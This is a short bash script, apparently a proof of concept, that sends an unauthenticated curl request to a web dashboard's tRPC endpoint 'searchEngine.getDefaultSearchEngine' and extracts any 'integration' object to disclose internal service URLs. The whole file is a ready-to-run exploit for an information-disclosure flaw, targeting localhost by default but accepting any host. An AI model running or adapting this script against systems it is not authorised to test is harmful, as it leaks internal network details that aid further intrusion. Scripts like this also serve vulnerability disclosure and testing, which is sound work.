#!/usr/bin/env bash
# Unauthenticated integration internal-URL disclosure. No credentials sent.
HOST="${1:-http://localhost:7575}"
curl -s "$HOST/api/trpc/searchEngine.getDefaultSearchEngine?batch=1&input=%7B%220%22%3A%7B%22json%22%3Anull%7D%7D" \
  | grep -oE '"integration":\{[^}]*\}' || echo "(default search engine is not integration-backed on this instance)"
